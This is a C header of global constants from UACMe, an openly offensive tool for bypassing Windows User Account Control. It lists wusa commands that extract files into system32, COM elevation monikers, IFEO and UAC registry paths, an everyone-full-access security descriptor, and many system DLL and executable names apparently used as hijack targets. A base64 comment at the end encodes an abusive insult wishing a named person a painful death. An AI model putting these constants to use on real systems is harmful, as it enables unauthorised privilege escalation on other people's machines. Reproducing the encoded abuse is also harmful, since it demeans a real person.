/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2016
*
*  TITLE:       CONSTS.H
*
*  VERSION:     2.51
*
*  DATE:        11 July 2016
*
*  Global consts definition file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

#define AKAGI_XOR_KEY               'naka'

#define T_IFEO                      L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define T_UACKEY                    L"MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"

#define CMD_EXTRACT_SYSTEM32        L"/c wusa %ws /extract:%%windir%%\\system32"
#define CMD_EXTRACT_WINSAT          L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
#define CMD_EXTRACT_MIGWIZ          L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"

#define T_CLSID_ShellSecurityEditor L"{4D111E08-CBF7-4f12-A926-2C7920AF52FC}"
#define T_IID_ISecurityEditor       L"{14B2C619-D07A-46EF-8B62-31B64F3B845C}"
#define ISECURITYEDITOR_ELEMONIKER  L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}" 
#define IFILEOP_ELEMONIKER          L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}"
#define T_SDDL_ALL_FOR_EVERYONE     L"D:(A;;GA;;;WD)"

#define MANIFEST_EXT                L".manifest"
#define ELLOCNAK_MSU                L"ellocnak.msu" 
#define KERNEL32_DLL                L"kernel32.dll"
#define OLE32_DLL                   L"ole32.dll"
#define SHELL32_DLL                 L"shell32.dll"
#define APPHELP_DLL                 L"apphelp.dll"
#define COMCTL32_DLL                L"comctl32.dll"
#define HIBIKI_DLL                  L"Hibiki.dll"
#define WBEMCOMN_DLL                L"wbemcomn.dll"
#define SLC_DLL                     L"SLC.dll"
#define NETUTILS_DLL                L"netutils.dll"
#define ACTIONQUEUE_DLL             L"ActionQueue.dll"
#define WDSCORE_DLL                 L"wdscore.dll"
#define MSCOREE_DLL                 L"MSCOREE.DLL"
#define DBGCORE_DLL                 L"dbgcore.dll"
#define SHCORE_DLL                  L"shcore.dll"
#define CRYPTBASE_DLL               L"cryptbase.dll"
#define NTWDBLIB_DLL                L"ntwdblib.dll"
#define ELSEXT_DLL                  L"elsext.dll"
#define POWRPROF_DLL                L"powrprof.dll"
#define DEVOBJ_DLL                  L"devobj.dll"
#define UNBCL_DLL                   L"unbcl.dll"
#define DISMCORE_DLL                L"dismcore.dll"
#define WOW64LOG_DLL                L"wow64log.dll"
#define CLICONFG_EXE                L"cliconfg.exe"
#define OOBE_EXE                    L"oobe.exe"
#define WINSAT_EXE                  L"winsat.exe"
#define CREDWIZ_EXE                 L"credwiz.exe"
#define INETMGR_EXE                 L"InetMgr.exe"
#define MMC_EXE                     L"mmc.exe"
#define EXPLORER_EXE                L"explorer.exe"
#define TASKHOST_EXE                L"taskhost.exe"
#define TZSYNC_EXE                  L"tzsync.exe"
#define SYSPREP_EXE                 L"sysprep.exe" 
#define SETUPSQM_EXE                L"oobe\\setupsqm.exe"   //always in this dir
#define MIGWIZ_EXE                  L"migwiz.exe"
#define SPINSTALL_EXE               L"spinstall.exe"
#define CONSENT_EXE                 L"consent.exe"
#define EVENTVWR_EXE                L"eventvwr.exe"
#define PKGMGR_EXE                  L"pkgmgr.exe"
#define SYSPREP_DIR                 L"sysprep\\"
#define INETSRV_DIR                 L"inetsrv\\"
#define WBEM_DIR                    L"wbem\\"
#define MIGWIZ_DIR                  L"migwiz\\"
#define RUNAS_VERB                  L"runas"
#define EVENTVWR_MSC                L"eventvwr.msc"
#define RSOP_MSC                    L"rsop.msc"
#define PACKAGE_XML                 L"ellocnak.xml"

#define LOCAL_SXS                   L".local"
#define FAKE_LOCAL_SXS              L".hawawa"
#define INETMGR_SXS                 L"microsoft-windows-iis-managementconsole"
#define COMCTL32_SXS                L"microsoft.windows.common-controls"

#define APPCMDLINE                  L"Not a security boundary! Just hack-o-rama. Keep it as is!"
#define PROGRAMTITLE                L"UACMe"
#define WOW64STRING                 L"Wow64 detected, use x64 version of this tool."
#define WOW64WIN32ONLY              L"This method only works with x86-32 Windows or from Wow64"
#define WIN64ONLY                   L"This method only works with x86-64 Windows"
#define LAZYWOW64UNSUPPORTED        L"Use 32 bit version of this tool on 32 bit OS version"
#define OSTOOOLD                    L"This method require Windows 7 and above"
#define WINBLUEWANTED               L"This method require Windows 8 and above"
#define UACFIX                      L"This method fixed/unavailable in the current version of Windows, do you still want to continue?"
#define T_AKAGI_KEY                 L"Software\\Akagi"
#define T_AKAGI_PARAM               L"LoveLetter"
#define T_AKAGI_FLAG                L"Flag"
#define T_TARGETNOTFOUND            L"Target application not found"
#define T_TARGETALREADYEXIST        L"[UCM] Target file already exists, abort"

//
// Global const 
//
// SGVsbG8sIHhzeXN2ZXJtaW4uIFlvdSBzdHVwaWQgcmlwcGVyIGZyb20gQ2hpbmEsIGhvcGUgeW91IHdpbGwgZGllIGluIHBhaW4gZnJvbSBkaWFycmhlYSA6KSBIYXZlIGEgbmljZSBkYXksIGZ1Y2tlci4=
//
